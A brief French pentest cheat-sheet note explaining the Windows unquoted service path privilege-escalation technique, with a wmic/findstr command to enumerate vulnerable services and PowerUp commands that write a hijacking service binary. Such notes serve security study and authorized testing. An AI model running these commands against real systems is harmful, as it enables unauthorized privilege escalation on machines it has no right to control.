Quand droit d'écriture mais pas de remplacement dans le dossier d'un service

CreateProcess prend un chemin pour l'executable.
Si il y a un espace alors il ajoute .exe à chaque espace jusqu'à ce qu'il trouve quelque chose.
**C:\Program Files\My Program\My Service\service.exe**

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My service\service.exe
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Trouver les chemins avec espace en cmd:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


# PowerUp
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
get-unquotedservice
Write-ServiceBinary -Name 'GammaService' -Path <HijackPath>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
